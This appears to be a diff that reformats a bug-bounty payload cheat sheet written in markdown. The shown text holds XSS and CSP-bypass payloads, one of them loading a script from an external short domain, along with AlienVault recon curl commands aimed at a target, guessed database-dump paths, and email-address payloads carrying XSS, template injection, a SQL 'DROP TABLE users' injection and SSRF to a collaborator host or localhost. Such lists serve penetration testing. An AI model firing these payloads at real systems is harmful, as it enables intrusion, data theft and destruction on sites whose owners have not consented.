@@ -64,8 +64,6 @@
 	<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
 
 #### *If unsafe-inline is disabled in CSP and external scripts allowed*
-
-#### *Just a casual script*
 	<script/src=//Ǌ.₨></script>
 
 #### *If you control the name of the window*
@@ -78,12 +76,10 @@
 	<svg/onload=eval(`'`+URL)>
 
 ##  Finding sensitive information using AlienVault:
-
-	-Go To :  https://otx.alienvault.com/indicator/domain/<TARGET>
-	-curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
-	
-	-To get only the list of URLs, we could do this:
-	-curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
+##### *Go To* :  https://otx.alienvault.com/indicator/domain/<TARGET>
+	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
+##### *To get only the list of URLs, we could do this*:
+	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
 	
 ##  Forgotten Database Dumps:
 	/back.sql
@@ -110,10 +106,10 @@
 
 
 ##  Email Address Payloads: 
-	##### *XSS (Cross-Site Scripting):*
-		test+(<script>alert(0)</script>)@example.com
-		test@example(<script>alert(0)</script>).com
-		"<script>alert(0)</script>"@example.com
+##### *XSS (Cross-Site Scripting):*
+	test+(<script>alert(0)</script>)@example.com
+	test@example(<script>alert(0)</script>).com
+	"<script>alert(0)</script>"@example.com
 
 ## Template injection:
 	"<%= 7 * 7 %>"@example.com
@@ -124,7 +120,6 @@
 	"mail'); DROP TABLE users;--"@example.com
 
 ## SSRF (Server-Side Request Forgery):
-
 	john.doe@abc123.burpcollaborator.net
 	john.doe@[127.0.0.1]
 
